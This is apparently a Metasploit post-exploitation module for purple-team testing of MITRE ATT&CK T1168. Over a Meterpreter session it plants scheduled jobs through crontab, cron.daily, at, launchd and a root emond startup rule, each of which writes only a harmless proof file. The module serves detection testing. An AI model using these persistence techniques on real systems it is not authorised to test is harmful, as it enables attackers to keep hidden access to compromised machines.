##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Local Job Scheduling (T1168) macOS/Unix - Purple Team',
      'Description'    => %q(
        On Linux and macOS systems, multiple methods are supported for creating
        pre-scheduled and periodic background jobs: cron, (Citation: Die.net
        Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page)
        and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike
        [Scheduled Task](https://attack.mitre.org/techniques/T1053) on
        Windows systems, job scheduling on Linux-based systems cannot be
        done remotely unless used in conjunction within an established
        remote session, like secure shell (SSH). CRON System-wide cron jobs
        are installed by modifying /etc/crontab file, /etc/cron.d/ directory
        or other locations supported by the Cron daemon, while per-user
        cron jobs are installed using crontab with specifically formatted
        crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This
        works on macOS and Linux systems. Those methods allow for commands
        or scripts to be executed at specific, periodic intervals in the
        background without user interaction. An adversary may use job
        scheduling to execute programs at system startup or on a scheduled
        basis for Persistence, (Citation: Janicab) (Citation: Methods of
        Mac Malware Persistence) (Citation: Malware Persistence on OS X)
        (Citation: Avast Linux Trojan Cron Persistence) to conduct
        Execution as part of Lateral Movement, to gain root privileges,
        or to run a process under the context of a specific account. AT -
        The at program is another means on POSIX-based systems, including macOS
         and Linux, to schedule a program or script job for execution at a
         later date and/or time, which could also be used for the same
         purposes. LAUNCHD - Each launchd job is described by a different
         configuration property list (plist) file similar to Launch Daemon or
         Launch Agent, except there is an additional key called
         StartCalendarInterval with a dictionary of time values.
         (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS
         and OS X.
      ),
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Praetorian' ],
      'Platform'       => [ 'osx', 'linux' ],
      'References'     => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1168' ] ],
      'SessionTypes'   => [ 'meterpreter' ]))
    register_options(
      [
        OptBool.new("CLEANUP", [true, "Cleanup artifacts or not.", false]),
        OptBool.new("ALL", [true, "Cleanup artifacts or not.", true]),
        OptBool.new("CrontabFile", [true, "Cleanup artifacts or not.", false]),
        OptBool.new("CronDaily", [true, "Cleanup artifacts or not.", false]),
        OptBool.new("at", [true, "Cleanup artifacts or not.", false]),
        OptBool.new("EventMonitor", [true, "Cleanup artifacts or not.", false]),
        OptBool.new("launchd", [true, "Cleanup artifacts or not.", false])
      ])
  end

  def crontab_file
    ### Start replace conrtab with file
    puts('')
    print_status('Backing up current crontab')
    old_crontab_cmd = cmd_exec('crontab -l > /tmp/old_crontab')

    # Echoes and echo command into a new crontab file and loads that file
    print_status('Replacing crontab with file')
    cmd = 'echo "* * * * * echo T1168-crontab-file-proof > '
    cmd += '/tmp/T1168-crontab-file-proof.txt" > /tmp/t1168-crontab && crontab '
    cmd += '/tmp/t1168-crontab || echo fail'
    crontab_file_cmd = cmd_exec(cmd)
    print_error('Crontab file tactic failed to stage') if crontab_file_cmd.include? 'fail'
    print_status("Sleeping 1 minute to check execution")
    # Make sure task has time to execute
    sleep 63

    # Test if the crontab job executed
    cmd = 'ls /tmp/T1168-crontab-file-proof.txt || echo fail'
    proof = cmd_exec(cmd)
    if proof.include? 'fail'
      print_error('Crontab file tactic executed but no proof was found.')
    else
      print_good('Crontab file tactic successful!')
    end

    if datastore['CLEANUP'] == true
      print_status('Cleaning up files...')
      cmd = 'rm /tmp/T1168-crontab-file-proof.txt /tmp/t1168-crontab || echo fail'
      cleanup = cmd_exec(cmd)
      if cleanup.include? 'fail'
        print_error('Unable to cleaup crontab files')
      else
        print_status('Cleaned up crontab files')
      end

      print_status("Restoring crontab...")
      cmd = 'crontab /tmp/old_crontab || echo fail && rm /tmp/old_crontab'
      cleanup = cmd_exec(cmd)
      if cleanup.include? 'fail'
        print_error('Unable to restore crontab')
      else
        print_status('Restored crontab')
      end
    end
  end

  def cron_daily
    ### Start create cron.daily job
    puts('')
    print_status('Adding job to cron.daily')
    cmd = "echo 'echo T1168-cron-daily-proof > /tmp/T1168-crontab-file-proof.txt' "
    cmd += "> /etc/cron.daily/t1168-daily-test || echo fail"
    cron_daily_cmd = cmd_exec(cmd)
    print_error('cron.daily tactic failed to stage') if cron_daily_cmd.include? 'fail'

    cmd = 'ls /etc/cron.daily/t1168-daily-test || echo fail'
    proof = cmd_exec(cmd)
    if proof.include? 'fail'
      print_error('cron.daily tactic executed but no proof was found.')
    else
      print_good('cron.daily tactic successful!')
      daily_status = cmd_exec('cat /etc/crontab | grep daily')
      print_status("Next daily run: #{daily_status}")
    end

    if datastore['CLEANUP'] == true
      cmd = 'rm T1168-cron-daily-proof.txt /etc/cron.daily/t1168-daily-test || echo fail'
      cleanup = cmd_exec(cmd)
      if cleanup.include? 'fail'
        print_error('Unable to cleaup cron.daily files')
      else
        print_status('Cleaned up cron.daily files')
      end
    end
  end

  def at
    ### Start create at task
    puts('')
    if sysinfo['OS'].include? 'macOS'
      print_status('Checking if at is enabled for macOS (not enabled by default)')
      at_status = cmd_exec('launchctl list | grep atrun')
      if at_status.include? 'atrun'
        print_status('at is enabled, continuing...')
      else
        print_status('at is not enabled, skipping check...')
        return
      end
    end

    print_status('Adding at task...')
    at_installed = cmd_exec('which at || echo fail')
    if at_installed.include? 'fail'
      print_error('at not installed...skipping')
      return
    end

    cmd = "echo 'echo T1168-at > /tmp/T1168-at-proof.txt' | at now + 1 minute"
    task = cmd_exec(cmd)
    print_status("Sleeping 1 minute to check execution")
    # Make sure task has time to execute
    sleep 63

    cmd = 'ls /tmp/T1168-at-proof.txt || echo fail'
    proof = cmd_exec(cmd)
    if proof.include? 'fail'
      print_error('at tactic executed but no proof was found.')
      print_error('This is disabled by default on OSX')
    else
      print_good('at tactic successful!')
    end

    if datastore['CLEANUP'] == true
      print_status('Cleaning up files and jobs')
      cmd = 'rm /tmp/T1168-at-proof.txt || echo fail'
      cleanup_files = cmd_exec(cmd)
      cmd = 'for i in $(at -l); do atrm $i; done'
      cleanup_jobs = cmd_exec(cmd)
      if cleanup_files.include? 'fail'
        print_error('Unable to cleaup at files')
      else
        print_status('Cleaned up at files and jobs')
      end
    end
  end

  def event_monitor
    ### Start event monitor tactic
    puts('')
    print_status('Starting Event Monitor Daemon tactic...')

    print_status('Creating .plist file')
    plist = %q(
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <array>
          <dict>
              <key>name</key>
              <string>t1168</string>
              <key>enabled</key>
              <true/>
              <key>eventTypes</key>
              <array>
                  <string>startup</string>
              </array>
              <key>actions</key>
              <array>
                  <dict>
                      <key>command</key>
                      <string>/usr/bin/touch</string>
                      <key>user</key>
                      <string>root</string>
                      <key>arguments</key>
                          <array>
                              <string>/tmp/T1168-emond.txt</string>
                          </array>
                      <key>type</key>
                      <string>RunCommand</string>
                  </dict>
              </array>
          </dict>
      </array>
      </plist>
    )

    cmd = "cat <<EOT >> /etc/emond.d/rules/t1168.plist #{plist} EOT || echo fail"
    create_plist = cmd_exec(cmd)
    # Test for success
    if create_plist.include? 'fail'
      print_error("Failed to create the PLIST file...exiting")
      return
    end

    print_status('Enabling Event Monitor...')
    # Any file in this directory will enable emond
    enable = cmd_exec('touch /private/var/db/emondClients/t1168 || echo fail')
    # Test for success
    if enable.include? 'fail'
      print_error("Failed to enable emond...exiting")
      return
    end

    print_good('Event Monitor tactic scheduled for next startup')
    print_status('You will need to manually reboot to check ')
    print_status('if /tmp/T1168-emond.txt exists to confirm success or failure.')

    if datastore['CLEANUP'] == true
      print_status('Cleaning up files...')
      cmd = 'rm /etc/emond.d/rules/t1168.plist /private/var/db/emondClients/t1168 || echo fail'
      cleanup = cmd_exec(cmd)
      puts(cleanup)
      if cleanup.include? 'fail'
        print_error('Unable to cleaup Event Monitor files')
      else
        print_status('Cleaned up Event Monitor files, proof file cannot be cleaned')
      end
    end
  end

  def launchd
    puts('')

    # Create PLIST Launch Agent file
    print_status("Creating .plist file to run with Launch Agent on a 10 second interval")
    cmd_exec('mkdir ~/Library/LaunchAgents')
    plist = %q(
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
        <dict>

          <key>Label</key>
          <string>com.t1168.laucnhd.plist</string>

          <key>RunAtLoad</key>
          <true/>

          <key>StartInterval</key>
          <integer>5</integer>

          <key>ProgramArguments</key>
          <array>
            <string>/usr/bin/touch</string>
            <string>/tmp/t1168-launchd.txt</string>
          </array>

        </dict>
      </plist>
    )
    cmd = "cat <<EOT >> ~/Library/LaunchAgents/com.t1168.launchd.plist #{plist} EOT || echo fail"
    create_plist = cmd_exec(cmd)
    # Test for success
    if create_plist.include? 'fail'
      print_error("Failed to create the PLIST file...exiting")
      print_error(create_plist)
      return
    end

    # Run the PLIST file with Launch Agent
    print_status("Executing payload. You should see a file written to /tmp/t1168-launchd.txt")
    cmd = "launchctl load -w ~/Library/LaunchAgents/com.t1168.launchd.plist || echo fail"
    run_it = cmd_exec(cmd)
    # Test for success
    if run_it.include? 'fail'
      print_error("Failed to run the payload...exiting")
      print_error(run_it)
      return
    end

    # Check for overall success by checking for the file after the interval
    print_status('Sleep 20 seconds to confirm job is running')
    # Remove the file created at job start to ensure scheduling works
    cmd_exec('rm /tmp/t1168-launchd.txt')
    sleep 20
    cmd = "ls /tmp/t1168-launchd.txt || echo fail"
    test_success = cmd_exec(cmd)
    if test_success.include? "fail"
      print_error("Proof file not found, tactic failed...exiting")
    else
      print_good('Successfully scheduled job with launchd...tactic successful!')
    end

    if datastore['CLEANUP'] == true
      print_status('Cleaning up files and jobs...')
      cmd = 'launchctl unload ~/Library/LaunchAgents/com.t1168.launchd.plist'
      cleanup_job = cmd_exec(cmd)
      cmd = 'rm ~/Library/LaunchAgents/com.t1168.launchd.plist /tmp/t1168-launchd.txt || echo fail'
      cleanup_files = cmd_exec(cmd)
      if (cleanup_files.include? 'fail') || (cleanup_job.include? 'fail')
        print_error('Unable to cleaup at files or job')
      else
        print_status('Cleaned up at files')
      end
    end
  end


  def run
    return 0 if session.type != "meterpreter"
    print_status('This module takes a couple minutes to run ')
    print_status('due to the nature of scheduling jobs.')
    puts('')

    print_status("Identified OS as: #{sysinfo['OS']}")

    # Module starting
    print_status('Testing tactics in the following order: ')
    print_status("\tReplace crontab with file (Unix and OSX)")
    print_status("\tAdd script to cron folder (Unix only)")
    print_status("\tCreate an at task (Unix and OSX)")
    print_status("\tlaunchd (OSX only)")
    print_status("\tEvent Monitor Daemon Persistence (OSX only)")
    puts('')

    if datastore['ALL'] || datastore['CrontabFile']
      crontab_file
    end
    if datastore['ALL'] || datastore['CronDaily']
      cron_daily if !sysinfo['OS'].include? 'macOS'
    end
    if datastore['ALL'] || datastore['at']
      at
    end
    if datastore['ALL'] || datastore['launchd']
      launchd if sysinfo['OS'].include? 'macOS'
    end
    if datastore['ALL'] || datastore['EventMonitor']
      event_monitor if sysinfo['OS'].include? 'macOS'
    end

  end
end
